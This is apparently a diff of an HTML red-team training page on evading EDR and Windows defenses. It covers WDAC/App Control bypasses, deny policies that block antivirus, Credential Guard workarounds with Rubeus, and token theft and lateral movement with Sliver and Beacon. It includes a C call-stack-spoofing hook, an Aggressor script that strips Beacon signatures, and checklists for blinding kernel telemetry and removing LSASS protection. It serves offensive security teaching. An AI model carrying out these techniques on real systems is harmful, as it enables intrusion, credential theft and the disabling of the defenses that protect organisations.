 <p>Admins sometimes whitelist entire directories with wildcards like <code>%OSDRIVE%\App-V\*</code>. The runtime writability check (when Runtime FilePath Rule Protection is enabled) restricts these: if the directory or file allows write access to any principal outside the admin SID list, execution is denied.</p>
 <p>App Control's admin SID list includes:</p>
 <table class="custom-table">
@@ -5911,7 +5742,7 @@ IDI_ICON1               ICON                    "src-main/7zip.ico"</code></pre>
 </table>
 <p>So writability checks pass if you control a local administrator. If <code>Runtime FilePath Rule Protection</code> is disabled in the policy, even standard users can drop a payload into the whitelisted directory and execute it.</p>
 
-<h3 id="crtl-appcontrol-living-off-the-land">8.11 Living Off The Land</h3>
+<h3 id="crtl-appcontrol-living-off-the-land">7.11 Living Off The Land</h3>
 <p>As with AppLocker, multiple signed and trusted Windows binaries allow arbitrary code execution through them. Jimmy Bayne's <strong>UltimateWDACBypassList</strong> catalogues most known bypasses.</p>
 <p>.NET compilation tools are popular because they execute dynamic code at runtime. <code>Microsoft.Workflow.Compiler</code> ships with all Windows builds and runs arbitrary C# from a XOML file. First, the compiler-input XML:</p>
 <pre><code class="language-bash">&lt;?xml version="1.0" encoding="utf-8"?&gt;
@@ -5968,10 +5799,10 @@ IDI_ICON1               ICON                    "src-main/7zip.ico"</code></pre>
 Hello World</code></pre>
 <p>This (and MSBuild, etc.) only works when <code>Dynamic Code Security</code> is disabled in the policy.</p>
 
-<h4 id="crtl-appcontrol-electron">8.11.1 Electron</h4>
+<h4 id="crtl-appcontrol-electron">7.11.1 Electron</h4>
 <p>Signed Electron apps run JavaScript at runtime through the Chromium engine and Node.js APIs &mdash; with full access to the local filesystem and processes. Bobby Cooke's <strong>Loki</strong> C2 platform is built around this. Many Electron apps (Teams, VS Code, GitHub Desktop) ship without ASAR integrity checking, so their JavaScript files can be swapped for backdoored versions and execution still goes through the trusted, signed parent process.</p>
 
-<h3 id="crtl-appcontrol-trusted-cas">8.12 Trusted CAs</h3>
+<h3 id="crtl-appcontrol-trusted-cas">7.12 Trusted CAs</h3>
 <p>Internal LOB apps may be signed with code-signing certs from a trusted CA &mdash; an internal one or a third-party purchase. Trust rules come in two formats. The first ties the rule to a CA cert plus a publisher name &mdash; any cert issued by the CA with a matching <code>CN</code> is trusted:</p>
 <pre><code class="language-xml">&lt;Signers&gt;
   &lt;Signer Name="Signer 1" ID="ID_SIGNER_S_0001"&gt;
@@ -6033,10 +5864,10 @@ Certificate reply was installed in keystore</code></pre>
     set alias "server";
 }</code></pre>
 
-<h3 id="crtl-appcontrol-weaponising-app-control">8.13 Weaponising App Control</h3>
+<h3 id="crtl-appcontrol-weaponising-app-control">7.13 Weaponising App Control</h3>
 <p>With local admin access to a protected endpoint, you can modify the deployed App Control policy &mdash; whitelist your own tools, or deny AV/EDR from running. Author policies with the <code>ConfigCI</code> PowerShell module, the App Control Wizard, or third-party tools like WDACTools.</p>
 
-<h3 id="crtl-appcontrol-supplemental-policies-2">8.14 Supplemental policies</h3>
+<h3 id="crtl-appcontrol-supplemental-policies-2">7.14 Supplemental policies</h3>
 <p>Supplemental policies can only extend trust &mdash; allow rules only, no deny rules. They're useful for whitelisting your own payloads, tools, and scripts.</p>
 <p>In the App Control Wizard:</p>
 <ol>
@@ -6052,7 +5883,7 @@ Operation Successful
 Press Enter to Continue</code></pre>
 <p>Remove a policy with <code>--remove-policy</code> (<code>-rp</code>).</p>
 
-<h3 id="crtl-appcontrol-deny-only-base-policies">8.15 Deny-only base policies</h3>
+<h3 id="crtl-appcontrol-deny-only-base-policies">7.15 Deny-only base policies</h3>
 <p>Deny rules must live in a base policy. Modifying the existing base is risky &mdash; deploy a custom deny-only base policy alongside it instead, since multiple base policies can coexist (an app must be allowed by <em>every</em> base policy to run).</p>
 <p>The wizard can't create a deny-only policy from scratch. Start from the <strong>AllowAll</strong> template at <code>C:\Windows\schemas\CodeIntegrity\ExamplePolicies\AllowAll.xml</code>. Starting from "allow all" sounds backward, but it's required &mdash; an empty base implicitly denies everything not explicitly allowed, which bricks the host.</p>
 <p>Walkthrough:</p>
@@ -6064,9 +5895,9 @@ Press Enter to Continue</code></pre>
 </ol>
 <p>If the target process is already running (like <code>MsMpEng.exe</code>), a reboot is needed before the deny takes effect.</p>
 
-<h2 id="crtl-credential-guard-9">9. Credential Guard</h2>
+<h2 id="crtl-credential-guard-9">8. Credential Guard Bypass</h2>
 
-<h3 id="crtl-cg-secrets">9.1 Credential Guard Secrets</h3>
+<h3 id="crtl-cg-secrets">8.1 Credential Guard Secrets</h3>
 <p>Credential Guard uses hardware virtualisation and the Windows hypervisor to isolate authentication materials &mdash; NTLM hashes, Kerberos TGTs, etc. &mdash; in a secure virtual container. It blocks techniques like Mimikatz <code>sekurlsa::ekeys</code> and Rubeus <code>dump</code>.</p>
 <table class="custom-table">
 <thead><tr><th>State</th><th>Secrets live in</th><th>Process</th></tr></thead>
@@ -6077,7 +5908,7 @@ Press Enter to Continue</code></pre>
 </table>
 <p>VBS is an official Microsoft security boundary: data inside the enclave cannot be accessed or tampered with from the outside. Don't confuse Credential Guard with LSA Protected Process (RunAsPPL).</p>
 
-<h3 id="crtl-cg-no-tgts">9.2 No TGTs for You</h3>
+<h3 id="crtl-cg-no-tgts">8.2 No TGTs for You</h3>
 <p>When a user first logs in, LSA passes the initial credentials to LSAIso and asks it to store them. LSAIso stores them and returns a handle that LSA uses to reference them later, then LSA destroys its copy. To obtain a TGT, LSA must ask LSAIso to encrypt the AS-REQ timestamp using the credential handle — the secrets themselves never leave the secure enclave.</p>
 <p>When the AS-REP arrives, LSA cannot decrypt the logon session key because it no longer knows the user's password. It passes the AS-REP to LSAIso for decryption, but LSAIso does not return the decrypted session key — it re-encrypts it with a key only it knows. All subsequent TGS-REQs are handled the same way: LSA gives the request to LSAIso to encrypt the authenticator, and LSAIso decrypts the returned TGS-REP.</p>
 <p>From an attacker's perspective, you can dump encrypted TGTs but the <code>KeyType</code> will show as something like <code>*_credguard</code>. Attempting to use the TGT for anything (e.g. <code>asktgs</code>) will fail. Rubeus crafts Kerberos messages from scratch and sends them directly to the KDC on port 88 &mdash; it cannot talk to LSAIso and cannot access the TGT's logon session key. This breaks many Kerberos abuse primitives:</p>
@@ -6090,7 +5921,7 @@ Press Enter to Continue</code></pre>
 </tbody>
 </table>
 
-<h3 id="crtl-cg-service-tickets">9.3 Extracting Service Tickets</h3>
+<h3 id="crtl-cg-service-tickets">8.3 Extracting Service Tickets</h3>
 <p>VBS is a security boundary, so extracting TGTs or their session keys from LSAIso should not be expected to work (any such vulnerabilities are quickly patched). Lean into credential access tactics that Credential Guard does not protect:</p>
 <table class="custom-table">
 <thead><tr><th>Source</th><th>Notes</th></tr></thead>
@@ -6217,7 +6048,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /s
   KeyType                  :  aes256_cts_hmac_sha1
   Base64(key)              :  YHhHpPyt786DmDpVANbGX+jnGaaae3aY90cUvFyv3vQ=</code></pre>
 
-<h3 id="crtl-cg-plaintext-tgt">9.4 TGTs from Plaintext Password</h3>
+<h3 id="crtl-cg-plaintext-tgt">8.4 TGTs from Plaintext Password</h3>
 <p>If you obtain the plaintext password of a user (e.g. through keylogging, cracking DCC hashes, or from an insecure application), <code>asktgt</code> will get you a useable TGT despite Credential Guard being in place. This works because Rubeus sends the AS-REQ directly to the KDC rather than going through LSA:</p>
 <p><strong>Sliver equivalent:</strong> Same Rubeus invocation, just routed through the armory-installed extension or <code>execute-assembly</code>:</p>
 <pre><code class="language-bash">sliver (SESSION) &gt; rubeus asktgt /user:rsteel /domain:CONTOSO.COM /password:Passw0rd! /enctype:aes256 /nowrap
@@ -6251,7 +6082,7 @@ sliver (SESSION) &gt; execute-assembly --amsi-bypass --etw-bypass \
   Base64(key)              :  wkykBvPwwQO4aj4cWPKP4a6ONZHNVL5xBoSqpgtFbOY=
   ASREP (key)              :  05579261E29FB01F23B007A89596353E605AE307AFCD1AD3234FA12F94EA6960</code></pre>
 
-<h3 id="crtl-cg-pkinit">9.5 PKINIT Certificates</h3>
+<h3 id="crtl-cg-pkinit">8.5 PKINIT Certificates</h3>
 <p>User and computer certificates in the Certificate Store are not protected by Credential Guard. If the environment supports authentication with PKINIT, you can dump these certificates and use them to obtain useable TGTs — particularly useful for obtaining TGTs of computer accounts.</p>
 <ul>
 <li>Extract user certificates using SharpDPAPI's <code>certificates /unprotect</code> command</li>
@@ -6325,105 +6156,1406 @@ MIINX[...snip...]CCAA=</code></pre>
   ASREP (key)              :  6250E247015F4EEB21373E5BE6C2E3A13EA94A108C3FAE0DBEE95BEE095BCA59</code></pre>
 <p>This request is sent straight to the KDC and does not go through LSA, so Credential Guard does not interfere.</p>
 
-<h2 id="methodology">10. Methodology</h2>
-<h3 id="methodology-recon">10.1 Defender Recon</h3>
+<h2 id="crtl-lateral-movement-6">9. User Impersonation</h2>
+
+<p>RTO covered multiple user impersonation techniques, but not all of them are viable in a modern EDR world.</p>
+
+<h3 id="crtl-lateral-make-token-createnetonly">9.1 make_token / createnetonly</h3>
+<p>Both commands clone the current token and attach new credentials for outbound connections, but go through different APIs:</p>
+<table class="custom-table">
+<thead><tr><th>Command</th><th>API</th><th>Logon type</th></tr></thead>
+<tbody>
+<tr><td>Beacon <code>make_token</code></td><td><code>LogonUserA</code></td><td><code>LOGON32_LOGON_NEW_CREDENTIALS</code></td></tr>
+<tr><td>Rubeus <code>createnetonly</code></td><td><code>CreateProcessWithLogonW</code></td><td><code>LOGON_NETCREDENTIALS_ONLY</code></td></tr>
+</tbody>
+</table>
+<p>Both generate logon events tagged with the calling process. Running <code>make_token</code> from a Beacon hosted outside <code>System32</code> or <code>Program Files</code> is suspicious; Rubeus' <code>/process</code> argument gives you control over the host process, which is easier to blend in. For maximum blend, target a process like <code>runas.exe</code> that legitimately produces these logon events by design.</p>
+<p><strong>Sliver equivalent:</strong> Sliver exposes both forms natively:</p>
+<pre><code class="language-bash">sliver (SESSION) &gt; make-token -u contoso\\rsteel -p Passw0rd! -d contoso.com
+# Token created, outbound auth now uses these creds
+
+sliver (SESSION) &gt; runas -u contoso\\rsteel -p Passw0rd! -P c:\\windows\\system32\\cmd.exe -a "/c whoami"
+# CreateProcessWithLogonW equivalent &mdash; spawns a new process under the target user
+
+sliver (SESSION) &gt; rev2self
+# Drops the impersonated token</code></pre>
+
+<h3 id="crtl-lateral-steal-token">9.2 steal_token</h3>
+<p>There's often no problem with stealing and impersonating the primary access token of other processes, as long as we can call the underlying APIs (<code>OpenProcess</code>, <code>OpenProcessToken</code>, <code>DuplicateToken</code>, <code>ImpersonateLoggedOnUser</code>) in an OPSEC-safe way. That may involve call stack spoofing, API unhooking, or syscalls, depending on the EDR you're up against.</p>
+<p><strong>Sliver equivalent:</strong> <code>impersonate</code> takes a target username and finds an existing logon session for them, then duplicates and impersonates that token. Drop with <code>rev2self</code>:</p>
+<pre><code class="language-bash">sliver (SESSION) &gt; impersonate contoso\\Administrator
+sliver (SESSION) &gt; rev2self</code></pre>
+
+<h3 id="crtl-lateral-kerberos">9.3 Kerberos</h3>
+<p>Most techniques like <code>asktgt</code>, <code>asktgs</code>, and <code>s4u</code> abuse (where raw Kerberos traffic is generated directly by the tool) are not possible against EDRs that monitor network traffic. On Windows, the only native process that normally generates Kerberos traffic from a domain joined host is <code>lsass.exe</code>, although there are some exceptions like <code>AzureADConnect.exe</code>.</p>
+<p>Dumping tickets and passing them into another logon session still works fine, as these actions don't touch LSASS directly, nor generate Kerberos traffic. However, there are other heavy restrictions on Kerberos tradecraft on modern hosts, which are discussed in the Credential Guard chapter.</p>
+<p><strong>Sliver equivalent:</strong> Sliver doesn't have native Kerberos tradecraft, but Rubeus is one armory install away and runs in-memory:</p>
+<pre><code class="language-bash">sliver &gt; armory install rubeus
+sliver (SESSION) &gt; rubeus triage
+sliver (SESSION) &gt; rubeus dump /luid:0x422abf /service:cifs /nowrap
+sliver (SESSION) &gt; rubeus ptt /ticket:doIGZ...
+
+# Same OPSEC problem as on CS &mdash; raw Kerberos traffic from a non-LSASS process is a red flag.</code></pre>
+
+<h2 id="crtl-lateral-movement">10. Lateral Movement</h2>
+
+<h3 id="crtl-lateral-wmi">10.1 WMI</h3>
+<p>The <code>remote-exec wmi</code> command is implemented as a BOF that calls <code>combase.dll!CoCreateInstance</code> to instantiate the COM object for remote WMI. That triggers a load-library event for <code>wbemprox.dll</code>, and because BOFs run from unbacked memory, the load looks like this:</p>
+<pre><code class="language-bash">C:\Windows\System32\KernelBase.dll!LoadLibraryExW+0xe6
+C:\Windows\System32\combase.dll!CoReleaseServerProcess+0xee9
+C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x9b0
+C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x24ce
+C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x67f1
+C:\Windows\System32\combase.dll!CoReleaseServerProcess+0x391
+C:\Windows\System32\combase.dll!CoCancelCall+0x1e65
+C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
+C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x727
+C:\Windows\System32\combase.dll!CoRevokeDeviceCatalog+0x1297
+C:\Windows\System32\combase.dll!InternalCAggIdRelease+0x155d
+C:\Windows\System32\combase.dll!CStdStubBuffer_AddRef+0xfe1
+C:\Windows\System32\combase.dll!IsErrorPropagationEnabled+0x58e
+C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
+C:\Windows\System32\combase.dll!CoWaitForMultipleHandles+0x775e
+C:\Windows\System32\combase.dll!HSTRING_UserSize64+0x80d
+C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x4722
+C:\Windows\System32\combase.dll!CoCreateFreeThreadedMarshaler+0x355b
+C:\Windows\System32\combase.dll!CoCreateInstance+0x120
+Unbacked+0x124</code></pre>
+<p>Beacon's BOF loader uses <code>LoadLibraryA</code> and <code>GetProcAddress</code> to resolve a BOF's imports, and since the PICO already hooks both, we can redirect the <code>CoCreateInstance</code> call through call stack spoofing. Add the hook to <code>hooks.c</code>:</p>
+<pre><code class="language-c">#include &lt;combaseapi.h&gt;
+
+DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID * );
+
+HRESULT WINAPI _CoCreateInstance ( REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID * ppv )
+{
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr  = ( PVOID ) ( OLE32$CoCreateInstance );
+    call.argc = 5;
+
+    call.args [ 0 ] = spoof_arg ( rclsid );
+    call.args [ 1 ] = spoof_arg ( pUnkOuter );
+    call.args [ 2 ] = spoof_arg ( dwClsContext );
+    call.args [ 3 ] = spoof_arg ( riid );
+    call.args [ 4 ] = spoof_arg ( ppv );
+
+    return ( HRESULT ) spoof_call ( &amp;call );
+}</code></pre>
+<p>And the corresponding entry in <code>pico.spec</code>:</p>
+<pre><code class="language-bash">addhook "OLE32$CoCreateInstance" "_CoCreateInstance"</code></pre>
+<p>For the executable side of <code>remote-exec wmi</code>, upload the payload somewhere that already contains binaries (e.g. <code>System32</code> or <code>Program Files</code>). Executing payloads from atypical directories is itself a detection.</p>
+<p><strong>Sliver equivalent:</strong> Sliver ships built-in WMI execution and a separate WMI-based implant deploy. The same unbacked-memory call stack issue applies if you run it from a non-implant process:</p>
+<pre><code class="language-bash">sliver (SESSION) &gt; wmi -H lon-dc-1 -u contoso\\rsteel -p Passw0rd! "cmd.exe /c whoami &gt; c:\\temp\\out.txt"
+
+# Or stage a new implant on a remote target via WMI
+sliver (SESSION) &gt; psexec -s "MyService" -d "Update Service" -c \\\\lon-dc-1\\admin$\\implant.exe lon-dc-1
+# (psexec in Sliver works for WMI too via --wmi flag in newer builds)</code></pre>
+
+<h5 id="crtl-lateral-suspicious-unsigned-execution-via-network-logon-wmi">Suspicious/Unsigned execution via network logon</h5>
+<p>EDRs will almost certainly flag a recently-created file being executed via a network logon. The "recently" window varies by vendor. Some workarounds:</p>
 <ul>
-  <li><input type="checkbox" data-id="crtl-recon-edr"> Identify the EDR / AV product, version, and any custom configurations before touching loader tradecraft</li>
-  <li><input type="checkbox" data-id="crtl-recon-drivers"> Enumerate kernel drivers (<code>fltmc</code>, <code>driverquery</code>) to map active callback owners and minifilters</li>
-  <li><input type="checkbox" data-id="crtl-recon-hooks"> Snapshot loaded user-mode hooks (which DLLs the EDR injects, which ntdll functions are hooked) using inline disassembly or a BOF</li>
-  <li><input type="checkbox" data-id="crtl-recon-etw"> Inventory active ETW providers and consumers; flag the ones that publish process / image / Kerberos events</li>
-  <li><input type="checkbox" data-id="crtl-recon-baseline"> Capture a baseline call-stack and module list for the spawnto process so anomalies show up clearly</li>
-  <li><input type="checkbox" data-id="crtl-recon-cguard"> Detect Credential Guard, HVCI, Process Mitigations, LSA Protection, and CFG state per host</li>
-  <li><input type="checkbox" data-id="crtl-recon-appcontrol"> Reverse deployed App Control / WDAC policies and identify enforced vs audit-only sections</li>
+<li>Upload the payload, wait a while, then run it.</li>
+<li>Use a LOLBAS to launch it indirectly &mdash; <code>cmd /c C:\Windows\System32\smb.exe</code> instead of <code>C:\Windows\System32\smb.exe</code> directly.</li>
+<li>Code-sign the payload.</li>
 </ul>
 
-<h3 id="methodology-loader">10.2 Load-Time Evasion (Loader Build)</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-loader-udrl"> Choose a UDRL or PIC framework (Crystal Palace, Stardust, udrl-vs) over the stock reflective loader</li>
-  <li><input type="checkbox" data-id="crtl-loader-prepend"> Use a prepended loader (PIC) instead of the stomped variant &mdash; better obfuscation surface</li>
-  <li><input type="checkbox" data-id="crtl-loader-modular"> Split the loader into modular COFFs (services, hooks, spoof, mask, cleanup) so techniques are swappable per build</li>
-  <li><input type="checkbox" data-id="crtl-loader-rwx"> Allocate RW first &rarr; copy &rarr; <code>VirtualProtect</code> to RX; never leave RWX pages</li>
-  <li><input type="checkbox" data-id="crtl-loader-obfuscate"> Apply code optimization, function reordering, and code mutation at link time to defeat static signatures</li>
-  <li><input type="checkbox" data-id="crtl-loader-mask"> Mask the appended Beacon DLL with an XOR or ChaCha20 stream key generated per build</li>
-  <li><input type="checkbox" data-id="crtl-loader-strrep"> Strip / replace signatured strings (<code>%02d/%02d/%02d</code>, <code>ReflectiveLoader</code>, etc.) via Aggressor <code>strrep_pad</code></li>
-  <li><input type="checkbox" data-id="crtl-loader-yara"> YARA-validate the final blob against published Beacon rules before delivery</li>
-  <li><input type="checkbox" data-id="crtl-loader-aggressor"> Wire the build into <code>BEACON_RDLL_GENERATE</code> and <code>BEACON_RDLL_GENERATE_LOCAL</code> so every payload gets the same treatment</li>
-</ul>
+<h3 id="crtl-lateral-psexec">10.2 PsExec</h3>
+<p>The use of PsExec is usually detected due to a service being created with a UNC <code>binPath</code>, such as <code>\\[target]\ADMIN$\foo.exe</code>. This is the behaviour of Beacon's built-in <code>jump psexec[64]</code> command. You could write a custom Aggressor script to use <code>C:\Windows\</code> (or some other directory) instead; or an alternate technique like SCShell, as this already uses <code>System32</code>. You could also upload the payload manually and execute it using <code>remote-exec psexec</code> (but don't forget to delete it afterwards). Remember that the service payload is the only one that performs remote injection. You will therefore certainly want to load the Artifact Kit to control the <code>spawnto</code>, etc.</p>
+<p><strong>Sliver equivalent:</strong> Sliver's <code>psexec</code> creates a Windows service on the target and points it at an implant binary you upload. Same UNC-binPath signature applies. Mitigation: upload to a non-UNC path first, then point the service at the local copy:</p>
+<pre><code class="language-bash"># Default behaviour (UNC binPath &mdash; signatured)
+sliver (SESSION) &gt; psexec -s "WinUpdate" -d "Windows Update Service" lon-dc-1
 
-<h3 id="methodology-runtime">10.3 Runtime Evasion (Once Beacon Is Resident)</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-runtime-pico"> Load a PICO alongside Beacon to host hook functions for evasion tradecraft</li>
-  <li><input type="checkbox" data-id="crtl-runtime-stack-spoof"> Implement call stack spoofing (Draugr-style synthetic frames or BeaconGate-equivalent) for every C2 API</li>
-  <li><input type="checkbox" data-id="crtl-runtime-gadget"> Pick gadget frames from modules that legitimately call the target API (<code>dfshim.dll</code> for <code>LoadLibraryA</code>, etc.) to survive backwards disassembly</li>
-  <li><input type="checkbox" data-id="crtl-runtime-syscalls"> Combine call stack spoofing with indirect syscalls so the call survives both ETW-TI and user-mode hook telemetry</li>
-  <li><input type="checkbox" data-id="crtl-runtime-mask"> Hook <code>Sleep</code> to mask Beacon's memory (XOR/RC4) and flip RX&rarr;RW for the sleep window</li>
-  <li><input type="checkbox" data-id="crtl-runtime-cleanup"> Schedule a timer-queue / <code>NtContinue</code>-based free of the Beacon DLL and PICO on <code>ExitThread</code></li>
-  <li><input type="checkbox" data-id="crtl-runtime-cfg"> Bypass CFG on the cleanup path via <code>NtSetInformationVirtualMemory</code> / <code>SetProcessValidCallTargets</code></li>
-</ul>
+# Upload first, then point the service at a local path
+sliver (SESSION) &gt; upload /tmp/implant.exe \\\\lon-dc-1\\c$\\windows\\system32\\winupdate.exe
+sliver (SESSION) &gt; execute -t -o sc.exe \\\\lon-dc-1 create WinUpdate binPath= "C:\\windows\\system32\\winupdate.exe" start= demand
+sliver (SESSION) &gt; execute -t -o sc.exe \\\\lon-dc-1 start WinUpdate
 
-<h3 id="methodology-postex">10.4 Post-Exploitation Evasion</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-postex-bof"> Prefer BOFs over fork &amp; run for short, one-shot tasks (no remote injection, smaller surface)</li>
-  <li><input type="checkbox" data-id="crtl-postex-loader-hook"> Hook Beacon's BOF loader APIs (<code>LoadLibraryA</code>, <code>GetProcAddress</code>) through the PICO so BOF dependencies route through spoofed stacks</li>
-  <li><input type="checkbox" data-id="crtl-postex-inject-kit"> Write custom <code>PROCESS_INJECT_SPAWN</code> / <code>PROCESS_INJECT_EXPLICIT</code> BOFs to control injection technique end-to-end</li>
-  <li><input type="checkbox" data-id="crtl-postex-postex-loader"> Use a custom postex loader so <code>execute-assembly</code> / <code>powerpick</code> / <code>psinject</code> get the same evasion tradecraft as Beacon</li>
-  <li><input type="checkbox" data-id="crtl-postex-amsi"> Block <code>amsi.dll</code> from loading (or patch <code>AmsiScanBuffer</code>) inside the postex loader's IAT hooks</li>
-  <li><input type="checkbox" data-id="crtl-postex-clr-hook"> Hook <code>LoadLibraryW</code>/<code>LoadLibraryExW</code> in <code>mscoree.dll</code>/<code>mscoreei.dll</code>/<code>clr.dll</code> to spoof the CLR image-load call stack</li>
-  <li><input type="checkbox" data-id="crtl-postex-strrep"> Run the postex DLL through <code>strrep_pad</code> to strip <code>ReflectiveLoader</code>, <code>powershell.x64.dll</code>, and other static signatures</li>
-  <li><input type="checkbox" data-id="crtl-postex-tool-strip"> Strip strings, comments, and recycle typelib GUIDs in .NET post-ex assemblies (Rubeus, SharpUp, Seatbelt)</li>
-  <li><input type="checkbox" data-id="crtl-postex-spawnto-args"> Set <code>spawnto</code> with realistic command-line arguments and pick a process that legitimately loads the CLR (<code>msiexec.exe</code>, <code>MSBuild.exe</code>)</li>
-  <li><input type="checkbox" data-id="crtl-postex-no-rwx"> Force <code>process-inject.startrwx</code> and <code>userwx</code> to <code>false</code>; choose an injection technique that never allocates RWX</li>
-  <li><input type="checkbox" data-id="crtl-postex-thread-start"> Spoof the thread start address via <code>ObfSetThreadContext</code> / <code>module!func+0x##</code> syntax in <code>process-inject.execute</code></li>
-</ul>
+# Or use SCShell-style technique via an extension
+sliver &gt; armory install scshell</code></pre>
 
-<h3 id="methodology-lateral">10.5 User Impersonation &amp; Lateral Movement</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-lateral-process"> Run <code>make_token</code> from a believable host process (e.g. <code>runas.exe</code>) so the resulting logon event blends in</li>
-  <li><input type="checkbox" data-id="crtl-lateral-steal"> Steal tokens via OPSEC-safe APIs (call-stack spoofed <code>OpenProcess</code> / <code>DuplicateToken</code>) where the EDR is hostile</li>
-  <li><input type="checkbox" data-id="crtl-lateral-kerberos"> Avoid raw Kerberos traffic from non-LSASS processes; use LSA-driven <code>asktgs</code> via Rubeus</li>
-  <li><input type="checkbox" data-id="crtl-lateral-cocreate"> Hook <code>CoCreateInstance</code> in the PICO so <code>remote-exec wmi</code> BOFs route through spoofed stacks</li>
-  <li><input type="checkbox" data-id="crtl-lateral-psexec"> Replace UNC <code>binPath</code> service-creation with a local path + service start (or SCShell-style alternative)</li>
-  <li><input type="checkbox" data-id="crtl-lateral-network-logon"> Avoid recently-created file execution over network logon; delay or sign payloads where required</li>
-</ul>
+<h3 id="crtl-lateral-beacon-rdll-generate-local">10.3 BEACON_RDLL_GENERATE_LOCAL</h3>
+<p><code>BEACON_RDLL_GENERATE_LOCAL</code> is the in-Beacon analogue of <code>BEACON_RDLL_GENERATE</code>. The UI-side hook fires when a payload is generated from the team server UI; the LOCAL variant fires when a Beacon command like <code>spawn</code> or <code>spawnas</code> needs to produce a payload on the fly.</p>
+<p>It receives the same arguments as the UI hook, plus two extras:</p>
+<table class="custom-table">
+<thead><tr><th>Arg</th><th>Value</th></tr></thead>
+<tbody>
+<tr><td><code>$5</code></td><td>Pointer to <code>GetModuleHandleA</code></td></tr>
+<tr><td><code>$6</code></td><td>Pointer to <code>GetProcAddress</code></td></tr>
+</tbody>
+</table>
+<p>These pointers are resolved by the parent Beacon and sent to the team server in metadata. They exist so they can be patched into the reflective loader, saving it from having to walk the EAT itself. Whether you use them depends on the defences in play &mdash; API calls from the loader will still be unbacked, so to actually benefit you'd need to wrap them in stack spoofing.</p>
+<p>The lab version of Crystal Kit doesn't support these pointers. Because Beacon's IAT is hooked through the PICO, the <code>GetModuleHandleA</code>/<code>GetProcAddress</code> pointers it resolves point at our PICO hook functions, not the real APIs. A patched loader using them crashes.</p>
+<p>Regardless of whether you use the pointers or not, the hook still needs to be registered in an Aggressor script. If you don't, any Beacon generated through one of these commands will not have any of our evasion tradecraft applied to it, and you'll effectively be running a vanilla Beacon. The code inside the hook can just be copy/pasted from the BEACON_RDLL_GENERATE hook:</p>
+<pre><code class="language-javascript">set BEACON_RDLL_GENERATE_LOCAL
+{
+    local ( '$beacon $arch $spec_path $spec $final' );
+    
+    $beacon = $2;
+    $arch   = $3;
+  
+    if ( $arch eq "x86" )
+    {
+        warn ( "Crystal Kit is x64 only" );
+        return $null;
+    }
+  
+    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );
+  
+    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
+    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
+    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
+    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );
+  
+    # get path to spec file
+    $spec_path = getFileProper ( script_resource ( "udrl" ), "loader.spec" );
+  
+    # parse the spec
+    $spec = [ LinkSpec Parse: $spec_path ];
+  
+    # apply the spec
+    $final = [ $spec run: $beacon, [ new HashMap ] ];
+  
+    if ( strlen ( $final ) == 0 )
+    {
+        warn ( "Failed to build payload" );
+        return $null;
+    }
+  
+    return $final;
+}</code></pre>
 
-<h3 id="methodology-kernel">10.6 Kernel-Resident Telemetry Disabling</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-kernel-driver"> Install a vulnerable signed driver (LOLDrivers candidate) for kernel R/W primitives</li>
-  <li><input type="checkbox" data-id="crtl-kernel-offsets"> Recover kernel structure offsets via either <code>ntoskrnl</code> image load + pattern scan or a pre-built version table</li>
-  <li><input type="checkbox" data-id="crtl-kernel-callbacks"> Zero entries in <code>PspCreateProcessNotifyRoutine</code>, <code>PspCreateThreadNotifyRoutine</code>, <code>PspLoadImageNotifyRoutine</code>, and <code>CmCallbackListHead</code> for the targeted driver</li>
-  <li><input type="checkbox" data-id="crtl-kernel-obregister"> Strip pre-/post-operation callbacks for process and thread handle ops via <code>ObRegisterCallbacks</code> tables</li>
-  <li><input type="checkbox" data-id="crtl-kernel-etwti"> Patch the ETW-TI <code>ProviderEnableInfo.IsEnabled</code> field to <code>0</code></li>
-  <li><input type="checkbox" data-id="crtl-kernel-ppl"> Patch <code>EPROCESS-&gt;Protection</code> to remove PPL on the target (LSASS dump, AV kill)</li>
-  <li><input type="checkbox" data-id="crtl-kernel-img-noise"> Run kernel BOFs from a Microsoft-signed parent process to dampen <code>ntoskrnl</code> image-load alerts; fall back to offset tables when image loading is monitored</li>
-  <li><input type="checkbox" data-id="crtl-kernel-cleanup"> Restore overwritten kernel structures (or reboot) at end of engagement to limit attribution surface</li>
-</ul>
+<h2 id="methodology">11. Methodology</h2>
+<p>Operator-checklist methodology for EDR evasion engagements. Each phase walks the tradecraft pipeline: understand the telemetry, build the evasion, validate the bypass, operate under the sensor.</p>
 
-<h3 id="methodology-appcontrol">10.7 App Control / WDAC Bypass</h3>
-<ul>
-  <li><input type="checkbox" data-id="crtl-app-policy-pull"> Pull every <code>.cip</code> file from <code>C:\Windows\System32\CodeIntegrity\CIPolicies\Active</code> and reverse offline with <code>ConvertTo-WDACCodeIntegrityPolicy</code></li>
-  <li><input type="checkbox" data-id="crtl-app-audit-mode"> Identify any base policy still running in audit mode &mdash; nothing is blocked, only logged</li>
